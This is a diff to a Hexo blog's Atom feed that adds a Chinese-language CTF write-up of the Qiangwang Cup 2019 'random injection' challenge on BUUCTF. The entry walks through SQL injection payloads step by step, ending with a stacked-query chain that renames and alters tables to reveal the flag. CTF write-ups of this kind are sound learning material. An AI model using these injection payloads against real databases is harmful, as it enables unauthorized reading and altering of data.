@@ -6,7 +6,7 @@
   <link href="https://iahzl.github.io/atom.xml" rel="self"/>
   
   <link href="https://iahzl.github.io/"/>
-  <updated>2023-08-05T09:15:41.829Z</updated>
+  <updated>2023-08-05T11:37:01.078Z</updated>
   <id>https://iahzl.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>随便注 1</title>
+    <link href="https://iahzl.github.io/%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/"/>
+    <id>https://iahzl.github.io/%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</id>
+    <published>2023-08-05T11:35:34.000Z</published>
+    <updated>2023-08-05T11:37:01.078Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="强网杯2019-随便注"></a>强网杯2019-随便注</h3><p>1，测试<code>1&#39; or 1=1 #</code>,初步判定存在SQL注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure><p>再测试字段数，到3时报错，说明字段数为2.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 # </span></span><br></pre></td></tr></table></figure><p>接着尝试union注入,回显了过滤的关键字。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230726152210746.png" alt="image-20230726152210746"></p><p>然后就是今天学会的新姿势“堆叠注入”了。<br>原理很简单，就是通过 ; 号注入多条SQL语句。<br>先通过show databases爆出数据库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure><p>然后用 show tables 尝试爆表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show tables; #</span></span><br></pre></td></tr></table></figure><p>可以看到这里有两个表，我们先尝试爆words表的内容。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from words; #</span></span><br></pre></td></tr></table></figure><p>表名为数字时，要用反引号包起来查询。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show columns from `1919810931114514 `; #</span></span><br></pre></td></tr></table></figure><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，给新 words 表添加新的列名 id 。</p><p>4，将 flag 改名为 data 。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id    int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span></span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;强网杯2019-随便注&quot;&gt;&lt;a href=&quot;#强网杯2019-随便注&quot; class=&quot;headerlink&quot; title=&quot;强网杯2019-随便注&quot;&gt;&lt;/a&gt;强网杯2019-随便注&lt;/h3&gt;&lt;p&gt;1，测试&lt;code&gt;1&amp;#39; or 1=1 #&lt;/code&gt;,初</summary>
+      
+    
+    
+    
+    <category term="-[CTF, BUUCTF]" scheme="https://iahzl.github.io/categories/CTF-BUUCTF/"/>
+    
+    
+    <category term="sql注入" scheme="https://iahzl.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+    <category term="buuctf" scheme="https://iahzl.github.io/tags/buuctf/"/>
+    
+  </entry>
   
   <entry>
     <title>WebsiteManger</title>
